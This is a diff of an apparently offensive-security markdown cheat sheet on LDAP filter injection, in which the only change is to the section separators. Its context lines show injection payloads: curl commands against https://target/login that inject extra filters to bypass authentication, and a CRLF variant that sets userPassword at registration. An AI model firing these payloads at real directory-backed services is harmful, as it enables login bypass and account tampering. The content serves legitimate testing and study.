@@ -17,7 +17,7 @@ linked:
 ---
 # LDAP Injection - Filter Manipulation
 
-***
+---
 
 ## AND / OR Injection
 
@@ -44,7 +44,7 @@ Result:    (&(uid=*)(|(uid=*))(password=*)(|(uid=*)))
             ^ matches everyone, ambos segments OR=true
 ```
 
-___
+---
 
 ## Nested Filters
 
@@ -57,7 +57,7 @@ ___
 | `curl --data-urlencode "username=*)(uid=*)(emergency=*)" -d "password=any" https://target/login` | Inject 3rd filter — bypass conditions | Filter compound trick. |
 ^ldap-filter-nested
 
-___
+---
 
 ## LDAP Attribute Injection (Add/Modify)
 
@@ -70,7 +70,7 @@ ___
 | `curl --data-urlencode "name=John%0d%0auserPassword: x" https://target/register` | CRLF injection variant | Some parsers strip LF only. |
 ^ldap-filter-attribute
 
-___
+---
 
 ## LDAP Comments y Null-Byte
 
@@ -94,4 +94,4 @@ ___
 | `\` | `\5c` |
 | NUL | `\00` |
 
-***
+---
